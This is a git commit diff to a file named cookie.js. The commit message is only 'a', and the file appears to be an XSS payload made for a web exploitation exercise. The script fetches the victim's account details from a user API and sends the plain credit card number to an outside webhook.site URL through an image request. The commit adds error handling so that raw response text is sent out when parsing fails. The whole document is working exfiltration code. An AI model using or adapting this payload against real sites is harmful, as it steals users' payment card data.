af20fe702ff3231fcb391185fb77384ae2ea4775
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 21:06:57 +0700

    a

--- cookie.js
+++ cookie.js
@@ -1,5 +1,12 @@
 fetch("/api/user.php?action=detail_info")
-  .then(r => r.json())
-  .then(data => {
-    new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(data.message.plain_credit_card || 'N/A');
+  .then(res => res.text())
+  .then(txt => {
+    try {
+      const data = JSON.parse(txt);
+      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" +
+        encodeURIComponent(data.message?.plain_credit_card || 'N/A');
+    } catch (e) {
+      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=INVALID_JSON&raw=" +
+        encodeURIComponent(txt.slice(0, 100));
+    }
   });
